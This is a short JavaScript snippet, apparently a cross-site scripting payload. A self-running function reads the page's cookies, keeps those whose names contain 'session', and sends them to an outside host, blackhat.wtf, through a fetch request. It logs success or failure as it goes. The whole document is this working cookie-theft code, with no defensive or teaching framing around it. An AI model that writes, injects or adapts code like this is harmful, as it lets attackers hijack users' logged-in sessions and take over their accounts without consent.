// Function to extract session cookies and send them to an external URL
(function () {
    try {
        // Get all cookies
        const cookies = document.cookie;

        // Extract session cookies (you can refine this logic based on your session cookie name pattern)
        const sessionCookies = cookies
            .split("; ")
            .filter(cookie => cookie.toLowerCase().includes("session"))
            .join("; ");

        // Check if session cookies exist
        if (!sessionCookies) {
            console.log("No session cookies found.");
            return;
        }

        // Construct the URL with the session cookies as a query parameter
        const url = `https://blackhat.wtf/?cookie=${encodeURIComponent(sessionCookies)}`;

        // Send the cookies to the specified URL
        fetch(url, { method: "GET" })
            .then(response => {
                if (response.ok) {
                    console.log("Session cookies successfully sent.");
                } else {
                    console.error("Failed to send cookies. HTTP status:", response.status);
                }
            })
            .catch(error => {
                console.error("Error while sending cookies:", error);
            });
    } catch (err) {
        console.error("An error occurred:", err);
    }
})();
